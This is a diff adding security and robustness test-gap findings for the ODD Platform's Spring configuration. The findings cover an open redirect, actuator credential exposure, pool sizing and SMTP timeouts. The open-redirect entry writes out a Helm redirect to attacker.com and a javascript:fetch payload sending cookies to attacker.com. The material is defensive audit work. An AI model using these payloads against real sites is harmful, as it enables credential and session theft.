+    4. Platform fails to boot with: `BeanCreationException: Error creating bean with
+    name ''alertNotificationMessageTranslator'' ... IllegalArgumentException: Could
+    not resolve placeholder ''notifications.message.downstream-entities-depth'' in
+    value "${notifications.message.downstream-entities-depth}"`.
+
+    5. The error message names the placeholder but not the SOURCE (which bean''s @Value
+    caused the failure) — operator has to grep the codebase to find NotificationConfiguration.java:123.
+
+
+    **Contrast with the CORRECT pattern at L105**: `@Value("${odd.platform-base-url:http://localhost:8080}")`
+    ships a sensible default. The same file demonstrates the right way to handle the
+    asymmetry.
+
+
+    **Test gap shape**: parametrised boot-time test asserting:
+
+    1. Boot SUCCEEDS with `notifications.enabled=true` + `notifications.receivers.email.sender=test@x`
+    + all required keys + `notifications.message.downstream-entities-depth=2`.
+
+    2. Boot SUCCEEDS with the same config but OMITTING `notifications.message.downstream-entities-depth`
+    — and asserts the depth DEFAULTS TO 1 (matches application.yml:174-175). Note:
+    under the current code this test FAILS — there is no @Value default; the YAML
+    default supplies it. The test is meant to FAIL until a `:1` default is added at
+    L123.
+
+    3. Boot FAILS with the same config but OMITTING `notifications.message.downstream-entities-depth`
+    AND overriding application.yml to remove the YAML default — expect `BeanCreationException`
+    (CURRENT BEHAVIOUR — regression-pin).
+
+
+    The compound test pins the asymmetry AND drives the fix (add `:1` default to L123
+    inline so the @Value carries its own default independent of YAML).'
+  test_class: missing-edge-case
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-782.yaml
+- gap_id: TEST-GAP-783
+  behaviour: '**HIGH — `auth.login-form-redirect` is an open-redirect surface with
+    no scheme/host/path validation. Combined with the doc absence (live `/configuration-and-deployment/enable-security/authentication/login-form`
+    page DOES NOT mention this key), an operator who templates the value from an upstream
+    pipeline introduces an attacker-controlled redirect target.** Sidecar primary-source
+    confirms three composing facts:
+
+
+    - **LoginFormSecurityConfiguration.java:41**: `@Value("${auth.login-form-redirect:}")`
+    reads the raw string from operator config; empty default falls back to `/`.
+
+    - **LoginFormSecurityConfiguration.java:89**: `URI.create(redirectUri)` parses
+    the string — accepts ANY scheme (http, https, javascript, data, file, vbscript).
+    Only validation is the URI parser''s syntactic check.
+
+    - **LoginFormSecurityConfiguration.java:46**: `new DefaultServerRedirectStrategy().sendRedirect(exchange,
+    redirectURI)` issues the 302 with the URI VERBATIM in the `Location` header.
+
+
+    No allowlist, no `@URL` constraint, no scheme check, no host check, no path-traversal
+    check.
+
+
+    **Operator-impact scenarios** (templated-config attack vectors):
+
+    1. Helm chart with `helm install --set auth.loginFormRedirect=https://attacker.com`
+    — every successful login redirects to attacker''s site. The attacker site hosts
+    a fake "Session expired, please re-authenticate" page and harvests credentials.
+
+    2. ConfigMap merged from a multi-tenant K8s namespace where the value is operator-controlled
+    by a less-privileged user.
+
+    3. Env-var substitution `auth.login-form-redirect=${EXTERNAL_PORTAL_URL}` where
+    `EXTERNAL_PORTAL_URL` is pulled from a CI/CD pipeline variable derived from a
+    GitHub Actions input.
+
+    4. `javascript:alert(1)` or `javascript:fetch(''https://attacker.com?cookie=''+document.cookie)`
+    — XSS-via-redirect if the browser honours non-http schemes in `Location` headers
+    (some browsers do, depending on the response status).
+
+
+    **STRENGTHENS existing TEST-GAP-142** (also names the open-redirect surface from
+    the same file). This sidecar adds the doc-drift dimension: WebFetched 2026-05-20
+    status 200 from `/configuration-and-deployment/enable-security/authentication/login-form`
+    confirms the key is NOT mentioned in the live docs. Operators have NO guidance
+    that this key is sensitive — the platform''s docs surface gives no warning.
+
+
+    **No live-doc mitigation**: confirmed at primary source via WebFetch. The doc
+    page covers `auth.type=LOGIN_FORM`, `auth.login-form-credentials`, security warnings
+    about plaintext credentials — but the redirect key is silent.
+
+
+    **Test gap shape**: regression-pin asserting:
+
+    1. With `auth.login-form-redirect=https://attacker.com`, successful form-login
+    returns HTTP 302 with `Location: https://attacker.com` (PINS current behaviour).
+
+    2. With `auth.login-form-redirect=javascript:alert(1)`, behaviour either crashes
+    boot (preferred — fail-loud) or issues the redirect.
+
+    3. With `auth.login-form-redirect=` (empty), successful login redirects to `/`
+    (existing TEST-GAP-142 path).
+
+
+    After the test pins the current behaviour, the fix is a one-method `validateRedirect(String)`
+    that enforces an allowlist (same-origin OR explicit allowlist via `auth.login-form-redirect.allowed-origins`).'
+  test_class: missing-security
+  criticality: HIGH
+  node_id: ''
+  feature_id: F-008
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-783.yaml
+- gap_id: TEST-GAP-784
+  behaviour: '**MEDIUM — R2DBC database credentials enter the JVM as plaintext `@Value`-injected
+    fields and are reachable via `/actuator/env`, which is exposed by default per
+    application.yml:230-231. Spring''s default masking covers `password|secret|key|token`
+    substring matches in the property KEY name — but the masking is a convention,
+    not a structural guarantee, and is not asserted by any test in the ODD codebase.**
+
+
+    **Confirmed at primary source**:
+
+    - R2DBCConfiguration.java:35 — `DataSourceProperties.getPassword()` reads `spring.datasource.password`
+    (default `odd-platform-password` per application.yml:7).
+
+    - R2DBCConfiguration.java:58 — `@Value("${spring.custom-datasource.password:}")`
+    reads `spring.custom-datasource.password` (empty default with fallback to primary).
+
+    - application.yml:230-231 — `management.endpoints.web.exposure.include: health,
+    prometheus, env, info` exposes the env endpoint by default.
+
+    - application.yml:237 — `management.endpoint.env.enabled: true` (implicit default).
+
+    - Spring Boot 3.4+ default `management.endpoint.env.show-values=NEVER` — but the
+    KEY name `password` is the only thing matched; rename to `spring.datasource.dbpass`
+    and the masking BREAKS (as a hypothetical refactor).
+
+
+    **Test gap shape**: integration test booting the platform with default actuator
+    config + a custom non-default datasource password, then `WebTestClient.get("/actuator/env")`,
+    then:
+
+    1. Assert the response is HTTP 200 (env is exposed).
+
+    2. Search for the literal password value in the response body — assert NOT FOUND
+    (Spring''s default masking IS working).
+
+    3. Confirm the masking-by-substring rule: rename to a key NOT matching `password|secret|key|token`
+    and confirm THAT renamed key would expose the value (documenting the convention
+    boundary).
+
+
+    PINS the current actuator-default-on + Spring-masking behaviour. A future change
+    to either default trips the test and forces explicit policy decision.'
+  test_class: missing-security
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-784.yaml
+- gap_id: TEST-GAP-785
+  behaviour: '**MEDIUM — R2DBCConfiguration injects `?schema=lookup_tables_schema`
+    into the custom-pool R2DBC URL via `UriComponentsBuilder` at lines 112-119, with
+    NO validation of the schema constant. The schema name `lookup_tables_schema` is
+    a HARD-CODED `public static final String` at line 25 — duplicated in two other
+    locations (ReferenceDataRepositoryImpl.java:57 + V0_0_86__create_schema_and_tables_for_custom_tables.sql:53).
+    Drift in any one breaks Lookup Tables silently.**
+
+
+    Additionally, the URL query-param injection at line 116-119 has NO validation
+    that the operator-provided `spring.custom-datasource.url` does not already contain
+    a `?schema=` parameter — the `UriComponentsBuilder.queryParam(SCHEMA, VALUE)`
+    call APPENDS, potentially producing `?other=...&schema=lookup_tables_schema&schema=lookup_tables_schema`
+    which is parser-dependent (Postgres takes the LAST value, but the platform should
+    not depend on this).
+
+
+    **Two composing risks**:
+
+
+    1. **Schema constant drift across 3 locations**: a refactor renaming the schema
+    (well-intentioned: `lookup_tables_schema` → `custom_tables_schema` for clarity)
+    requires updating all three locations atomically. Any one missed → schema-not-found
+    runtime error at every Lookup-Table operation (compile + boot OK; first-call failure).
+
+
+    2. **URL parameter injection / collision**: an operator who points `spring.custom-datasource.url`
+    at a deliberately-separate Postgres deployment AND wants control over the schema
+    is silently overridden — the platform appends `?schema=lookup_tables_schema` regardless.
+    The doc-drift finding (live `/configuration-and-deployment/odd-platform` 2026-05-20
+    status 200) confirms operators have NO warning that the URL is rewritten.
+
+
+    **Test gap shape**: parametrised test asserting:
+
+    1. Default config (custom keys blank) — `customConnectionPool` opens against `spring.datasource.url
+    + "?schema=lookup_tables_schema"`; verify the URL via reflection on the pool''s
+    options.
+
+    2. Custom URL with NO `?schema=` — the platform appends `?schema=lookup_tables_schema`;
+    verify single query-param.
+
+    3. Custom URL WITH `?schema=other_schema` — the platform STILL appends `?schema=lookup_tables_schema`;
+    verify TWO `schema=` query-params present (current behaviour). PINS the silent-override
+    surface; drives a fix to either RESPECT operator-provided schema or REJECT at
+    boot with a clear error.
+
+    4. Schema-constant drift detection — assert `R2DBCConfiguration.VALUE_PART_FOR_CUSTOM_DB_URL`
+    equals `ReferenceDataRepositoryImpl.SCHEMA_NAME` equals the literal in V0_0_86.
+    Tests THREE source-of-truth alignment.'
+  test_class: missing-security
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-785.yaml
+- gap_id: TEST-GAP-786
+  behaviour: '**MEDIUM — `customConnectionPool` is instantiated UNCONDITIONALLY at
+    R2DBCConfiguration.java:54 — no `@ConditionalOnProperty` gate on `spring.custom-datasource.url`.
+    Every ODD Platform deployment, including those that never use Lookup Tables, opens
+    TWO R2DBC connection pools (each with `initialSize` connections from Spring Boot''s
+    default of ~10) — 20+ PG connection slots minimum per replica, regardless of feature
+    usage.**
+
+
+    Sidecar primary source:
+
+    - R2DBCConfiguration.java:54 — `@Bean(name = "customConnectionPool", destroyMethod
+    = "dispose")` with NO `@ConditionalOnProperty`.
+
+    - Compared to other opt-in beans: `HousekeepingJobManager.java:18` (gated), `NotificationConfiguration.java:27`
+    (gated by @ConditionalOnNotifications), `OAuthSecurityConfiguration.java:71` (gated
+    by auth.type=OAUTH2).
+
+    - When all three `spring.custom-datasource.*` keys are blank (the shipped default),
+    the bean falls back to primary `DataSourceProperties` and opens a SECOND pool
+    against the SAME database, only differing by the `?schema=lookup_tables_schema`
+    URL query-param.
+
+
+    **Operator-impact scenarios**:
+
+    - Small dev deployment (1 replica, no Lookup Tables): 20 PG connection slots consumed
+    (10 primary pool + 10 custom pool) for zero benefit.
+
+    - Production deployment (5 replicas, Lookup Tables in active use): 100 PG connection
+    slots consumed at default sizing — PG `max_connections` default is 100, so a 5-replica
+    deployment with NO collectors / no operator tools at the edge.
+
+    - K8s Resource sizing: operators sizing their PG backend based on the primary
+    pool alone (the "one R2DBC pool per replica" mental model) under-provision; first
+    symptom is PG `too many connections` errors during scale-out.
+
+
+    **Test gap shape**:
+
+    1. Default-config bean assertion — verify both `connectionPool` (primary, @Primary)
+    AND `customConnectionPool` exist in the context.
+
+    2. Connection-count assertion — verify the platform opens 2N connections to PG
+    at startup (where N is the default pool initialSize).
+
+    3. Conditional-creation pin (the FIX direction) — under a hypothetical future
+    `@ConditionalOnProperty(name="custom-datasource.enabled", havingValue="true")`
+    gate, verify the bean is ABSENT when the property is unset; this test would FAIL
+    against the current code (the bean IS present); PINS the absence of the gate.
+
+
+    After the fix lands (REFACTOR-NNN adding a feature-flag for custom-datasource),
+    the test naturally inverts to verify gated creation.'
+  test_class: missing-edge-case
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-786.yaml
+- gap_id: TEST-GAP-787
+  behaviour: '**MEDIUM — R2DBCConfiguration wires `PropertyMapper.alwaysApplyingWhenNonNull()`
+    for ALL TEN `R2dbcProperties.Pool` settings (maxIdleTime / maxLifeTime / maxAcquireTime
+    / maxCreateConnectionTime / initialSize / maxSize / validationQuery / validationDepth
+    / minIdle / maxValidationTime) at lines 41-50 + 75-84 — yet `application.yml`
+    declares ZERO `spring.r2dbc.pool.*` overrides, and the live docs publish NONE
+    of these as operator knobs. The platform''s pool ceiling is whatever Spring Boot''s
+    framework default ships — typically `maxSize=10`, but not committed to.**
+
+
+    **Three composing risks**:
+
+    1. **Framework drift**: a future Spring Boot upgrade that changes the default
+    `maxSize` silently changes ODD''s deployed pool ceiling. No `application.yml`
+    override pins the value.
+
+    2. **Operator silence**: WebFetched 2026-05-20 status 200 from `/configuration-and-deployment/odd-platform`
+    confirms NONE of the ten pool keys are documented. Operators sizing high-RPS deployments
+    have no published guidance.
+
+    3. **Authorization hot path saturation**: per existing concept catalog (`authorization-hot-path-getcurrentuserroles-per-request-no-cache.yaml:44-45`),
+    R2DBC pool size is the upper bound; the authorization checks saturate the pool
+    under load.
+
+
+    **Two pools × max-size 10 × N replicas = practical concurrency budget for the
+    ENTIRE platform''s DB access.** A 5-replica deployment with default Spring Boot
+    pool sizes can sustain max 100 concurrent DB queries. PG `max_connections` default
+    is 100 — operators are at the edge with NO platform-side telemetry.
+
+
+    **Test gap shape**:
+
+    1. Boot-time assertion — verify `spring.r2dbc.pool.max-size` is unset in the application
+    context (PINS the framework-default reliance).
+
+    2. Spring Boot version pin — assert the resolved Spring Boot version (via Manifest
+    or BuildInfo) — a future upgrade trips the test and forces re-verification of
+    the framework default.
+
+    3. Optional: bind a deliberate override `spring.r2dbc.pool.max-size=50` via `@TestPropertySource`;
+    verify the pool actually accepts the override via PropertyMapper.
+
+
+    PINS the current framework-default reliance; documents the gap; drives the operator-facing
+    knob to docs + a tested default at the platform level.'
+  test_class: missing-performance
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-787.yaml
+- gap_id: TEST-GAP-788
+  behaviour: '**MEDIUM (compound when paired with the case-sensitivity trap TEST-GAP-775)
+    — `NotificationConfiguration.java:61-69` populates JavaMail''s Properties bag
+    with `mail.transport.protocol`, `mail.smtp.auth`, `mail.smtp.starttls.enable`
+    ONLY. NONE of `mail.smtp.connectiontimeout`, `mail.smtp.timeout`, `mail.smtp.writetimeout`
+    is set. JavaMail''s defaults are INFINITE. A hung SMTP relay blocks the notification-subscriber
+    thread indefinitely, stalling delivery on ALL channels (Slack + webhook + email
+    — they share the single-threaded WAL subscriber).**
+
+
+    **STRENGTHENS existing TEST-GAP-178 + TEST-GAP-202** with the config-class-tier
+    primary source. Prior batches surfaced this from the EmailSenderProperties tier
+    (TEST-GAP-178) and a sibling tier (TEST-GAP-202). This sidecar is the config-class
+    primary source confirming the EXACT lines of the missing keys.
+
+
+    **Cross-channel impact** (a deeper finding from this sidecar): the notification
+    subscriber is SINGLE-THREADED per `NotificationSubscriber.java` (sibling sidecar).
+    The shared `HttpClient` at L31-34 is also single per JVM. So a hung SMTP relay
+    blocks the THREAD, which in turn blocks the Slack + webhook senders that depend
+    on the same thread''s continuation. The TIMEOUT-UNSET issue is not just an email-channel
+    problem — it''s a notification-subsystem-wide single point of failure.
+
+
+    **Live doc evidence** (WebFetched 2026-05-20 from `/configuration-and-deployment/odd-platform`):
+    the SMTP timeout warning IS in the docs ("an unreachable SMTP server will hang
+    notification delivery"). Doc-side remediation is in place. Code-side remediation
+    is unimplemented.
+
+
+    **Test gap shape**: integration test with a stub SMTP server that NEVER responds
+    (Testcontainers GenericContainer running `nc -l 25` or a slow-resolver mock);
+    send an alert; assert the platform''s `JavaMailSenderImpl.send(...)` blocks INDEFINITELY
+    (or until JVM-test-timeout fires, e.g., 30s). PINS the current behaviour. The
+    fix (REFACTOR-NNN) adds three `mail.smtp.connectiontimeout=5000` etc. lines to
+    NotificationConfiguration.java:61-69.'
+  test_class: missing-security
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-788.yaml
+- gap_id: TEST-GAP-789
+  behaviour: '**MEDIUM — `SessionConfiguration`''s REDIS branch (lines 61-65) only
+    stamps `@EnableRedisWebSession` — no health-check wiring. `application.yml:244-245`
+    ships `management.health.redis.enabled: false` as the default. Operators switching
+    to `session.provider=REDIS` are not nudged to enable the health check. A Redis
+    outage on a session-Redis-only deployment causes 5xx on every authenticated request,
+    but `/actuator/health` does NOT reflect it.**
+
+
+    Sidecar primary source:
+
+    - SessionConfiguration.java:61-65 — the REDIS branch is JUST `@EnableRedisWebSession`;
+    no `RedisHealthIndicator` bean, no `management.health.redis.enabled: true` recommendation
+    in code or YAML.
+
+    - application.yml:244-245 — `management.health.redis: enabled: false` as the shipped
+    default.
+
+    - WebFetched 2026-05-20 status 200 — live `/configuration-and-deployment/odd-platform#select-session-provider`
+    mentions Spring Session Redis but does NOT recommend enabling the health check.
+
+
+    **Operator-impact scenario**:
+
+    1. Production operator sets `session.provider=REDIS` for cluster-safety (per TEST-GAP-781
+    mitigation).
+
+    2. K8s Ingress + Service routes `/actuator/health` to the platform; LB uses 200
+    OK as health-readiness signal.
+
+    3. Redis outage occurs (planned maintenance, network partition, OOM).
+
+    4. Every authenticated request returns 5xx (session lookup fails).
+
+    5. `/actuator/health` still returns 200 OK (Redis health check is disabled by
+    default).
+
+    6. LB / K8s does NOT remove the platform pod from rotation; users see persistent
+    5xx.
+
+
+    **Test gap shape**:
+
+    1. `@SpringBootTest` with `session.provider=REDIS` + Testcontainers Redis; submit
+    `/actuator/health`; assert response body does NOT contain `redis` component (the
+    health check is disabled).
+
+    2. Stop the Redis container; submit an authenticated request; assert HTTP 5xx;
+    submit `/actuator/health`; assert HTTP 200 (the silent-failure surface).
+
+    3. Hypothetical fix-direction: `@TestPropertySource("management.health.redis.enabled=true")`;
+    assert `/actuator/health` returns 503 when Redis is down. CONFIRMS the fix''s
+    effectiveness.
+
+
+    PINS the current silent failure surface until REFACTOR-NNN enables the Redis health-check
+    when `session.provider=REDIS` is selected (via a Spring `@Conditional` or via
+    documented application.yml change).'
+  test_class: missing-integration
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-789.yaml
+- gap_id: TEST-GAP-790
+  behaviour: '**LOW — MinioConfig.java:19-25 never calls `.httpClient(...)` on `MinioAsyncClient.builder()`.
+    The MinIO SDK''s default OkHttp client uses ~5-minute timeouts that are NOT operator-tunable.
+    Operators on slow networks with large `attachment.max-file-size` see unrecoverable
+    socket timeouts.**
+
+
+    **Sibling to TEST-GAP-776** (`.region(...)` unset, LSN-002 — CRITICAL). Both are
+    Gate-5 unset-parameter-audit findings on the same builder chain. Severity is LOW
+    here because the SDK default timeouts are NOT a security risk (unlike the region
+    issue) and NOT a data-loss risk — they are a slow-deployment usability issue with
+    a manual workaround (operators can increase `attachment.max-file-size` or reduce
+    file sizes on slow networks).
+
+
+    **Test gap shape**: regression-pin asserting the builder chain has EXACTLY three
+    calls (`.endpoint`, `.credentials`, `.build`) — no `.httpClient(...)`. PINS the
+    absence; drives REFACTOR-034 to surface operator-tunable timeouts.'
+  test_class: missing-performance
+  criticality: LOW
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-790.yaml
+- gap_id: TEST-GAP-791
+  behaviour: '**LOW — MinioConfig.java:23 calls the two-argument `.credentials(accessKey,
+    secretKey)` — which constructs a `StaticProvider` implicitly. The MinIO SDK''s
+    `Provider` interface (`StaticProvider`, `IamAwsProvider`, `WebIdentityProvider`,
+    etc.) is bypassed. AWS EKS / ECS operators wanting IAM-role-based credentials
+    (IRSA, instance profiles) cannot use them.**
+
+
+    **Third Gate-5 unset-parameter-audit finding** on the MinioConfig builder chain
+    (alongside `.region(...)` — TEST-GAP-776 — and `.httpClient(...)` — TEST-GAP-790).
+    Severity is LOW because it is a DEPLOYMENT-FLEXIBILITY gap (operator convenience),
+    not a security risk in itself — static keys still work; operators simply lack
+    the IRSA/instance-profile alternative.
+
+
+    **Test gap shape**: regression-pin asserting the credentials path is hard-coded
+    to static-key construction. The fix direction (REFACTOR-NNN) is to accept a `Provider`
+    bean optionally via `@Qualifier("minioCredentialsProvider")` if present, falling
+    back to the static-key path.'
+  test_class: missing-security
+  criticality: LOW
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-791.yaml
+- gap_id: TEST-GAP-792
+  behaviour: '**LOW — R2DBCConfiguration.java:31 converts `jdbc:postgresql://...`
+    → `r2dbc:postgresql://...` via raw `.replace("jdbc", "r2dbc")`. If the JDBC URL''s
+    hostname or database-name contains the literal substring `jdbc` (LOW likelihood
+    with standard PG deployments; possible with hostnames like `jdbc-host.example.com`
+    or DB names like `jdbc_test`), the URL becomes corrupted at multiple positions.**
+
+
+    Example failure:
+
+    - Operator config: `spring.datasource.url=jdbc:postgresql://jdbc-internal.example.com:5432/jdbc_db`
+
+    - Post-replace: `r2dbc:postgresql://r2dbc-internal.example.com:5432/r2dbc_db`
+    — DNS resolution fails (host doesn''t exist), bean wiring throws at boot.
+
+
+    Severity is LOW because (a) the failure is loud (boot fails — fail-fast), (b)
+    standard PG hostnames don''t contain `jdbc`, (c) the fix is one line (`.replaceFirst("^jdbc:",
+    "r2dbc:")`).
+
+
+    **Test gap shape**: parametrised test asserting URL conversion behaviour for both
+    standard and edge-case URLs. The current `.replace` will FAIL the edge case; the
+    fix replaces with `.replaceFirst`.'
+  test_class: missing-edge-case
+  criticality: LOW
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-792.yaml
+- gap_id: TEST-GAP-793
+  behaviour: '**LOW — An invalid or misspelled `session.provider` value (e.g., `IN-MEMORY`
+    with hyphen, `inmemory` lowercase, `postgres`, anything else) boots the platform
+    SILENTLY with NO `ReactiveSessionRepository<MapSession>` bean registered. The
+    `SpringWebSessionCondition.matches` at SessionConfiguration.java:51-57 returns
+    `false` for anything other than literal strings `INTERNAL_POSTGRESQL` / `IN_MEMORY`.
+    The REDIS branch''s `@ConditionalOnProperty` similarly returns `false`. No fail-fast,
+    no WARN log, no enum.**
+
+
+    Sidecar evidence:
+
+    - SessionConfiguration.java:51-57 — the `.equals("INTERNAL_POSTGRESQL")` / `.equals("IN_MEMORY")`
+    checks are case-sensitive literals.
+
+    - SessionConfiguration.java:62 — REDIS branch via `@ConditionalOnProperty(havingValue
+    = "REDIS")` — also case-sensitive.
+
+    - No enum, no central validator, no boot-time log naming the accepted set.
+
+
+    **Operator-impact scenario**: an operator setting `SESSION_PROVIDER=REDIS_CLUSTER`
+    (a forwards-thinking value name not yet supported) or `IN-MEMORY` (typo) boots
+    a platform with no session backing — Spring''s auto-configuration may fall through
+    to a default `InMemoryReactiveSessionRepository` or fail at first session-write
+    request. The platform''s behaviour in this degenerate state is dependent on whether
+    Spring Boot''s auto-config provides a fallback.
+
+
+    **Test gap shape**: parametrised test asserting:
+
+    1. Valid values (`IN_MEMORY`, `INTERNAL_POSTGRESQL`, `REDIS`) — bean wiring per
+    provider.
+
+    2. Invalid values (`in_memory` lowercase, `IN-MEMORY`, `redis`, `''''`) — assert
+    either a fail-fast at boot OR (current behaviour) a silent fallback, documenting
+    which.
+
+
+    PINS the current silent-boot surface; drives REFACTOR-NNN to add an enum-based
+    validator.'
+  test_class: missing-edge-case
+  criticality: LOW
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-793.yaml
